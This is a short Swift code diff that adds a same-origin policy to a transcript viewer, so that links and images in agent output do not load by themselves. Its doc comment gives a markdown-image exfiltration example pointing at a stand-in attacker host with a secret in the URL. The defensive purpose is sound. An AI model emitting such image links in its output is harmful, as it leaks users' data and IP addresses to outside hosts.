@@ -267,3 +267,14 @@ enum TranscriptLinkPreviewEligibility {
         return cache
     }()
 }
+
+/// Which links and images in a transcript may load by themselves. Agent output can
+/// name any host, and fetching one as the row appears would hand that host the
+/// phone's IP and whatever the URL carries (`![](https://evil/?d=secret)`). Only
+/// the active server's own origin loads on its own; anything else waits for a tap.
+enum TranscriptRemoteFetchPolicy {
+    static func loadsAutomatically(_ url: URL, serverOrigin: URL?) -> Bool {
+        guard let serverOrigin else { return false }
+        return APIClient.isSameOrigin(url, as: serverOrigin)
+    }
+}
